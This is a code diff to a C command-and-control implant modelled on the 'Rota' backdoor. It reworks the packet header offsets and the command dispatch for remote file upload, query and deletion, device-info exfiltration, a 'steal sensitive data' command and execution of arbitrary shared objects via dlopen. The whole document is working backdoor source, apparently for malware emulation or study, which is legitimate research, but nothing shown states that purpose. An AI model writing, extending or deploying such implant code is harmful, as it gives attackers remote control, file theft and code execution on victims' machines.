@@ -64,8 +64,8 @@ void c2_loop(){
         int payload_length;
 
         // zero out cmd id
-        memset(cmd_id, 0, 2);
-        memcpy(cmd_id, &buffer[27], 2);
+        memset(cmd_id, 0, 4);
+        memcpy(cmd_id, &buffer[14], 4);
 
         // parse out cmd id
         cmd_id = parse_c2_cmdid(buffer);
@@ -79,14 +79,14 @@ void c2_loop(){
         #endif
 
         // exit ==> 0x13 0x8E 0x3E 0x06
-        if (memcmp(&rota_c2_exit, cmd_id, 2) == 0) {
+        if (memcmp(&rota_c2_exit, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run exiting!");
             #endif
             c2_exit(sock);
         }
         // perform a "PING"/"PONG" connectivity test
-        else if (memcmp(&rota_c2_test, cmd_id, 2) == 0) {
+        else if (memcmp(&rota_c2_test, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 ping/ping!");
             #endif
@@ -95,7 +95,7 @@ void c2_loop(){
             build_c2_response(buffer, cmd_id, sock);
 
         }
-        else if (memcmp(&rota_c2_heartbeat, cmd_id, 2) == 0) {
+        else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 heartbeat!");
             #endif
@@ -103,7 +103,7 @@ void c2_loop(){
             build_c2_response(buffer, cmd_id, sock);
 
         }
-        else if (memcmp(&rota_c2_set_timeout, cmd_id, 2) == 0) {
+        else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 set timeout!");
             #endif
@@ -121,23 +121,23 @@ void c2_loop(){
 
             build_c2_response(msg, cmd_id, sock);
         }
-        else if (memcmp(&rota_c2_steal_data, cmd_id, 2) == 0) {
+        else if (memcmp(&rota_c2_steal_data, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run steal sensitive data\n");
             #endif
 
         }
-        else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 2) == 0) {
+        else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run upload dev info\n");
             #endif
 
-            char *buffer = (char *)malloc(200);
-            c2_upload_device_info(buffer);
+            char *uname_buffer = (char *)malloc(200);
+            c2_upload_device_info(uname_buffer);
             // buffer is now populated as hostname-Linux-kernel-version
-            build_c2_response(buffer, cmd_id, sock);
+            build_c2_response(uname_buffer, cmd_id, sock);
         }
-        else if (memcmp(&rota_c2_upload_file, cmd_id, 2) == 0) {
+        else if (memcmp(&rota_c2_upload_file, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 upload file \n");
             #endif
@@ -148,9 +148,8 @@ void c2_loop(){
             fclose(fd);
 
             build_c2_response(buffer, cmd_id, sock);
-
         }
-        else if (memcmp(&rota_c2_query_file, cmd_id, 2) == 0) {
+        else if (memcmp(&rota_c2_query_file, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run query file\n");
             #endif
@@ -171,7 +170,7 @@ void c2_loop(){
             }
 
         }
-        else if (memcmp(&rota_c2_delete_file, cmd_id, 2) == 0) {
+        else if (memcmp(&rota_c2_delete_file, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run delete file\n");
             #endif
@@ -203,21 +202,17 @@ void c2_loop(){
                 build_c2_response(msg, cmd_id, sock);
             }
         }
-        else if (memcmp(&rota_c2_run_plugin_1, &cmd_id, 2) == 0) {
+        else if (memcmp(&rota_c2_run_plugin_1, &cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run Plugin 1\n");
             #endif
-        }
-        else if (memcmp(&rota_c2_run_plugin_2, &cmd_id, 2) == 0) {
+
+
+        } else {
             #ifdef DEBUG
-            printf("[+] Rota C2 Run Plugin 2\n");
+            printf("Unknown command id %s\n", cmd_id);
             #endif
 
-        }
-        else if (memcmp(&rota_c2_run_plugin_3, &cmd_id, 2) == 0) {
-            #ifdef DEBUG
-            printf("[+] Rota C2 Run Plugin 3\n");
-            #endif
 
         }
 
@@ -247,7 +242,7 @@ void c2_exit(int sock) {
     memcpy(&rotaResp[4], &msgLen, msgLen);
 
     // set cmd id to "exit" (0x13, 0x8e, 0x3e, 0x06)
-    memcpy(&rotaResp[27], &rota_c2_exit, sizeof(rota_c2_exit));
+    memcpy(&rotaResp[14], &rota_c2_exit, sizeof(rota_c2_exit));
 
     // reallocate space from 82 byte header + response "body"
     rotaResp = realloc(rotaResp, (82 + strlen(msg)));
@@ -361,7 +356,6 @@ void c2_run_plugin_1(char *soPath, char *funcName) {
 
     void *handle = dlopen(soPath, RTLD_LAZY);
     void (*func_ptr)() = dlsym(handle, funcName);
-
     // execution of shared object
     func_ptr();
     dlclose(handle);
@@ -380,11 +374,20 @@ char *initial_rota_pkt() {
 
     memset(rotaHdr, 0, 82);
 
+    // 0-> 4 == magicbytes
     memcpy(rotaHdr, magicBytes, sizeof(magicBytes));
-    memcpy(&rotaHdr[4], payloadLen, sizeof(payloadLen));
+
+    // payload length 8->11
+    memcpy(&rotaHdr[8], payloadLen, sizeof(payloadLen));
+
+    // byte 12 and 13  == key length
+    memcpy(&rotaHdr[12], keyLen, sizeof(keyLen));
+
+    // 14th -> 18th command id
+    memcpy(&rotaHdr[14], cmd_id, sizeof(cmd_id));
+
     memcpy(&rotaHdr[19], marker_1, sizeof(marker_1));
     memcpy(&rotaHdr[24], marker_2, sizeof(marker_2));
-    memcpy(&rotaHdr[27], cmd_id, sizeof(cmd_id));
     memcpy(&rotaHdr[29], marker_3, sizeof(marker_3));
     memcpy(&rotaHdr[75], marker_4, sizeof(marker_4));
 
@@ -394,7 +397,7 @@ char *initial_rota_pkt() {
 char *parse_c2_cmdid(char *buffer) {
     char *cmd_id  = (char *)malloc(4);
     memset(cmd_id, 0, 4);
-    memcpy(cmd_id, &buffer[27], 4);
+    memcpy(cmd_id, &buffer[14], 4);
     return cmd_id;
 }
 
@@ -402,7 +405,7 @@ int parse_c2_payload_len(char *buffer) {
 
     int len;
     // convert char to integer
-    memcpy(&len, &buffer[4], sizeof(int));
+    memcpy(&len, &buffer[8], sizeof(int));
     return len;
 }
 
@@ -427,14 +430,16 @@ void build_c2_response(char *buffer, char *cmd_id, int sock){
 
     // correct length of payload on buffer
     int buffer_len = strlen(buffer);
-    char buffer_len_hex[4] = {0x00};
+    char buffer_len_hex[8] = {0x00};
 
     // convert and store integer in rota header
     sprintf(buffer_len_hex, "%d", buffer_len);
-    memcpy(&rota_resp_pkt[4], buffer_len_hex, sizeof(buffer_len));
+    memcpy(&rota_resp_pkt[8], buffer_len_hex, sizeof(buffer_len));
 
     // update cmd_id in response packet
-    memcpy(&rota_resp_pkt[27], cmd_id, sizeof(cmd_id));
+    memcpy(&rota_resp_pkt[14], cmd_id, sizeof(cmd_id));
+    // update cmd_id in response packet
+    memcpy(&rota_resp_pkt[19], marker_1, sizeof(marker_1));
 
     // reallocate space from 82 byte header + response "body"
     rota_resp_pkt = realloc(rota_resp_pkt, (82 + buffer_len));
